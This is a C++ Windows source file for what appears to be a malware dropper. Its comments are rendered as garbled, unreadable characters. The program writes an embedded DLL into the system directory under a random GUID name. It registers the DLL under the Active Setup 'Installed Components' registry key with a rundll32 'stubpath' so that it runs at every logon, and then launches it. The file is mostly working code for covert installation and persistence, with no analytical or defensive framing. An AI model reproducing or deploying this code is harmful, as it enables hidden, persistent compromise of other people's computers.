// ActiveX.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"
#include <objbase.h>
#include <stdio.h>



bool CreateMyFile(char* strFilePath,LPBYTE lpBuffer,DWORD dwSize)
{
	DWORD dwWritten;
	
	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}
                       //Ҫ�ͷŵ�·��   ��ԴID            ��Դ��
bool CreateEXE(char* strFilePath,int nResourceID,char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// �����������Դ
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "������Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL, hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "װ����Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "�����ڴ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// ������Դ����
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	
	
	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}
	
	GlobalFree((HGLOBAL)p);
	
	return true;
}

BOOL GetNUM(char *num)
{
	CoInitialize(NULL);
	char buf[64] = {0};
	GUID guid;
	if (S_OK == ::CoCreateGuid(&guid))
	{
		_snprintf(buf, sizeof(buf)
			, "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}"
			, guid.Data1
			, guid.Data2
			, guid.Data3
			, guid.Data4[0], guid.Data4[1]
			, guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5]
			, guid.Data4[6], guid.Data4[7]
			);
	}
	CoUninitialize();
	memcpy(num,buf,64);
	return TRUE;
}

void ActiveXSetup()
{
	HKEY hKey;
	char strFileName[MAX_PATH];           //dll�ļ���
	//char strFileName2[64];           //dll�ļ���
	char ActivexStr[1024];                //���ڴ洢ActiveX�ļ��ִ�
	char ActiveXPath[MAX_PATH];            //ActiveX·��
	char ActiveXKey[64];                   //ActiveX ��GUID�ִ�
    char strCmdLine[MAX_PATH];              //�洢�����������в���


    ZeroMemory(strFileName,MAX_PATH);
	//ZeroMemory(strFileName2,MAX_PATH);
	ZeroMemory(ActiveXPath,MAX_PATH);
	ZeroMemory(ActivexStr,1024);
	ZeroMemory(ActiveXKey,MAX_PATH);
    ZeroMemory(strCmdLine,MAX_PATH);
     
	//�õ�Activex·��
	strcpy(ActiveXPath,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\");
	//�õ�Activex��GUID
	GetNUM(ActiveXKey);
	//����dll�����ļ���

	//strncpy(strFileName2,ActiveXKey+1,10);

    GetSystemDirectory(strFileName,MAX_PATH);
	strcat(strFileName,"\\");
	strcat(strFileName,ActiveXKey);
	strcat(strFileName,".dll");

	    //�ͷ��ļ�
  if(CreateEXE(strFileName,IDR_DLL,"DLL"))
  {
    //����ActiveX��ע����ֵ
	sprintf(ActivexStr,"%s%s",ActiveXPath,ActiveXKey);
	//�������ע���
    int l_reg=	RegCreateKey(HKEY_LOCAL_MACHINE,ActivexStr,&hKey);  //ERROR_SUCCESS

	if(l_reg!=ERROR_SUCCESS)
	{
		//MessageBox(0,"д��ע���ʧ��","",0);
		return;
	}

   //������������������в���
	sprintf(strCmdLine,"%s %s,FirstRun","rundll32.exe",strFileName);
	//������д��ע�����
	RegSetValueEx(hKey,"stubpath",0,REG_EXPAND_SZ,(BYTE *)strCmdLine,lstrlen(strCmdLine));
	RegCloseKey(hKey);


	//���������
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb=sizeof(STARTUPINFO);
	StartInfo.lpDesktop=NULL;
	StartInfo.lpReserved=NULL;
	StartInfo.lpTitle=NULL;
	StartInfo.dwFlags=STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2=0;
	StartInfo.lpReserved2=NULL;
	StartInfo.wShowWindow=SW_SHOWNORMAL;
	BOOL bReturn=CreateProcess(NULL,strCmdLine,NULL,NULL,FALSE,NULL,NULL,NULL,&StartInfo,&ProcessInformation);
  }   

  return ;
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

	ActiveXSetup();

	return 0;
}



